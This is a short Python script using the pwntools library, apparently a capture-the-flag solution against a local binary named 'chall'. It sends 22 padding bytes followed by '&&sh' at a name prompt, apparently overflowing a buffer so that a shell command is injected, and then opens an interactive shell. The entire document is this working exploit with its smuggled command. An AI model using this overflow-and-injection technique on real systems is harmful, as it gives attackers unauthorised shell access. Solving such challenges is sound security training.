#!/bin/python3
from pwn import *
p = process('./chall')
payload = b'A'*22 + b'&&sh'
p.sendlineafter(b'What is your name:',payload)


p.interactive()
